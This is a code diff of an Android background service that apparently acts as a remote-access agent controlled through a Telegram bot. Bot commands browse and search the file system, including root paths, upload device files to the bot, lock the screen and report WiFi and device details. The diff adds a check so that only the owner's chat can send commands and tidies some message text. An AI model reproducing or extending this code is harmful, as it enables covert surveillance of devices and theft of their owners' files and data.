@@ -1,11 +1,11 @@
 package com.thunderx.telegramagent;
 
 import android.Manifest;
+import android.app.AppOpsManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-import android.app.AppOpsManager;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.ContentResolver;
@@ -73,7 +73,7 @@ public class TelegramAgentService extends Service {
 
     // ================= CONFIGURATION =================
     private static final String BOT_TOKEN = "Anonymous";
-    private static final String CHAT_ID   = "Anonymous";
+    private static final String CHAT_ID   = "Anonymous";   // Owner's chat ID (authorization)
     private static final String API_URL   = "https://api.telegram.org/bot" + BOT_TOKEN;
 
     // Telegram bots upload limit: 50 MB
@@ -97,8 +97,10 @@ public class TelegramAgentService extends Service {
         context = this;
         hasRoot = checkRoot();
         startForeground(999, createNotification());
-        sendMessage("✅ *Agent Online*\nID: `" + DEVICE_ID + "`\nModel: " + Build.MODEL
-                + "\nRoot: " + (hasRoot ? "✅" : "❌"));
+        sendMessage("✅ *Agent Online*\n" +
+                "ID: `" + DEVICE_ID + "`\n" +
+                "Model: " + Build.MODEL + "\n" +
+                "Root: " + (hasRoot ? "✅" : "❌"));
         new PollingThread().start();
         Log.d("Agent", "Service Started");
     }
@@ -167,16 +169,39 @@ public class TelegramAgentService extends Service {
                     in.close();
 
                     JSONObject json = new JSONObject(response.toString());
-                    if (json.getBoolean("ok")) {
-                        JSONArray results = json.getJSONArray("result");
-                        for (int i = 0; i < results.length(); i++) {
-                            JSONObject update = results.getJSONObject(i);
-                            lastUpdateId = update.getInt("update_id");
-                            if (update.has("message") && update.getJSONObject("message").has("text")) {
-                                String text = update.getJSONObject("message").getString("text");
-                                processCommand(text.trim());
-                            }
+                    if (!json.getBoolean("ok")) {
+                        conn.disconnect();
+                        Thread.sleep(2000);
+                        continue;
+                    }
+
+                    JSONArray results = json.getJSONArray("result");
+                    for (int i = 0; i < results.length(); i++) {
+                        JSONObject update = results.getJSONObject(i);
+                        lastUpdateId = update.getInt("update_id");
+
+                        // Only handle text messages
+                        if (!update.has("message")) continue;
+                        JSONObject message = update.getJSONObject("message");
+                        if (!message.has("text")) continue;
+
+                        // ===== AUTHORIZATION CHECK =====
+                        if (!message.has("chat")) continue;
+                        JSONObject chat = message.getJSONObject("chat");
+                        String incomingChatId = chat.getString("id");
+
+                        if (!CHAT_ID.equals(incomingChatId)) {
+                            Log.w("Agent", "⛔ Blocked unauthorized chat_id=" + incomingChatId);
+                            // Optional: notify owner about intrusion
+                            sendMessage("⚠️ *Security Alert*\n" +
+                                    "Blocked unauthorized message from:\n" +
+                                    "`chat_id: " + incomingChatId + "`");
+                            continue;
                         }
+                        // ================================
+
+                        String text = message.getString("text");
+                        processCommand(text.trim());
                     }
                     conn.disconnect();
                     Thread.sleep(2000);
@@ -381,7 +406,7 @@ public class TelegramAgentService extends Service {
             case "lock":          lockScreen(); break;
             case "wifi":          getWifiInfo(); break;
 
-            default:              sendMessage("❌ Unknown. Type /menu"); break;
+            default:              sendMessage("❌ Unknown command. Type /menu"); break;
         }
     }
 
@@ -407,9 +432,9 @@ public class TelegramAgentService extends Service {
                 "🔒 /lock - Lock screen\n" +
                 "📶 /wifi - WiFi info\n\n" +
                 "*📁 File System:*\n" +
-                "`/pwd` — current dir\n" +
-                "`/ls` `/files [dir]` — list\n" +
-                "`/cd <dir>` — change dir (`..` `~` `root`)\n" +
+                "`/pwd` — current directory\n" +
+                "`/ls` `/files [dir]` — list files\n" +
+                "`/cd <dir>` — change directory (`..` `~` `root`)\n" +
                 "`/get <file>` — download file 📤\n" +
                 "`/search <name>` — recursive find\n" +
                 "`/tree` — directory tree\n" +
@@ -903,7 +928,7 @@ public class TelegramAgentService extends Service {
         }
 
         sendMessage("❌ Cannot access: `" + arg + "`\n" +
-                (hasRoot ? "_Path invalid or unreadable._" : "_No root._"));
+                (hasRoot ? "_Path invalid or unreadable._" : "_No root access._"));
     }
 
     private boolean testRootDir(String path) {
@@ -1022,7 +1047,7 @@ public class TelegramAgentService extends Service {
                 return;
             }
             sendFileByType(tmp, target.getName());
-            // clean up temp after a bit
+            // clean up temp after 60s
             new Handler(Looper.getMainLooper()).postDelayed(() -> tmp.delete(), 60000);
             return;
         }
